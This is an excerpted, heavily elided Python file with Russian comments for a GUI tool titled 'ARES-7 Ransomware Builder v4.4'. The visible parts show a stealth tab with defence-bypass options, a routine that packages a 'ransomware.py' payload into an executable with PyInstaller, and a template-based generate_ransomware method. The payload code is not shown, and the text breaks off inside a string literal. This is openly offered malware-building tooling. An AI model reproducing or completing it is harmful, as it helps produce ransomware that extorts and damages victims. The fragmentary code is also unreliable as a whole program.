...
class RansomwareBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 ARES-7 Ransomware Builder v4.4")
    ...
    def build_frame(self):
        ...
        version_label = ttk.Label(header, text="v4.4", 
    ...
    def create_tab_stealth(self):
        ...
        # Дополнительные методы обхода (отдельные галочки)
    ...
    def build(self):
        try:
            ...
            with tempfile.TemporaryDirectory() as tmpdir:
                ...
                # Читаем вывод с более подробной информацией
                stderr_output = ""
                while True:
                    ...
                    if output == '' and err == '' and process.poll() is not None:
                        break
                    if output:
                        if "Building" in output or "Analyzing" in output or "Collecting" in output:
                            self.update_status(f"⏳ {output.strip()[:60]}...", "#ffaa00")
                    if err:
                        stderr_output += err
                ...
                if process.returncode != 0:
                    ...
                    error_msg += "• Ошибка в коде ransomware.py (проверьте синтаксис)"
                    self.show_error("Ошибка сборки", error_msg)
                    return
                ...
                if os.path.exists(final_path):
                    ...
                    self.show_error("Ошибка", "Файл не был создан, хотя PyInstaller завершился без ошибок")
                    
        except Exception as e:
            import traceback
            error_detail = traceback.format_exc()
            self.show_error("Ошибка", f"{str(e)}\n\nПодробности:\n{error_detail[:500]}")
        finally:
    ...
    def show_error(self, title, message):
        ...
        self.update_status(f"❌ {message[:50]}...", self.colors["error"])
    ...
    def generate_ransomware(self, config, output_path):
        # ============================================================
        # ВАЖНО: Используем %s для подстановки, а не .format()!
        # Это гарантирует, что фигурные скобки {} в коде не будут
        # интерпретироваться как место для подстановки.
        # ============================================================
...
if __name__ == "__main__":
    main()
'''
        # Используем % для подстановки (НЕ .format!)
